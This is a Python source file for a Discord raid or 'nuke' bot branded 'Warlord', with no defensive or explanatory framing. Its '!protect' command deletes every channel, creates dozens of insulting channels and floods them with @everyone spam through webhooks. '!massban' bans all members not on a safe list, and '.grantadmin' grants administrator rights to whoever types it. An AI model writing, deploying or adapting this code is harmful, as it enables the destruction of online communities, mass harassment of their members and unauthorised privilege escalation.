import discord
import aiohttp
import asyncio
import random

# Set up bot intents
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

client = discord.Client(intents=intents)

# Read bot token from file
with open("bottokens.txt", "r") as f:
    token = f.read().strip()

# Read safe users list (users to exclude from mass banning)
try:
    with open("userids.txt", "r") as f:
        safe_users = set(f.read().splitlines())
except FileNotFoundError:
    safe_users = set()

# Customize channel emojis, names, and spam messages
channel_emojis = ["🔥", "💀", "👿", "🤡", "🖕", "🤖", "👺", "⚡"]
channel_names = ["warlord-owns-you", "skid-clown", "cry-more-skid", "warlord-on-top"]
spam_messages = [
    "@everyone Cry skids, Warlord owns you!",
    "@everyone This server is pathetic! Warlord Nation rules!",
    "@everyone Skid Nation has fallen. Fear the Warlord!",
    "@everyone Warlord on top! Skids on bottom!"
]

MAX_PINGS = 200000
current_pings = 0

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")

@client.event
async def on_message(message):
    if message.content == "!protect":
        guild = message.guild
        await delete_all_channels(guild)
        await create_channels_webhooks_and_spam(guild)

    elif message.content == "!massban":
        await massban(message)

    elif message.content == ".grantadmin":
        await grant_admin(message)

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

async def create_channels_webhooks_and_spam(guild):
    channels = []
    webhooks = []
    async def create_channel_and_webhook():
        name = f"{random.choice(channel_emojis)}-{random.choice(channel_names)}-{random.randint(1000,9999)}"
        channel = await guild.create_text_channel(name)
        channels.append(channel)
        await create_webhook_with_retry(channel, webhooks)
        asyncio.create_task(spam_webhook(webhooks[-1]))

    tasks = [create_channel_and_webhook() for _ in range(60)]
    await asyncio.gather(*tasks)

async def create_webhook_with_retry(channel, webhooks):
    while True:
        try:
            webhook = await channel.create_webhook(name="Warlord")
            webhooks.append(webhook)
            return
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(5)

async def spam_webhook(webhook):
    global current_pings
    async with aiohttp.ClientSession() as session:
        while current_pings < MAX_PINGS:
            data = {"content": random.choice(spam_messages)}
            try:
                async with session.post(webhook.url, json=data) as response:
                    if response.status == 204:
                        current_pings += 1
            except Exception as e:
                print(f"Error spamming webhook {webhook.name}: {e}")

async def massban(message):
    guild = message.guild
    async for member in guild.fetch_members(limit=None):
        if str(member.id) not in safe_users:
            try:
                await guild.ban(member, reason="Warlord Mass Ban")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

async def grant_admin(message):
    guild = message.guild
    user = message.author
    admin_role = await guild.create_role(name="Warlord Admin", permissions=discord.Permissions(administrator=True))
    await user.add_roles(admin_role)
    await message.channel.send(f"{user.mention}, you now have administrator privileges.")

client.run(token)
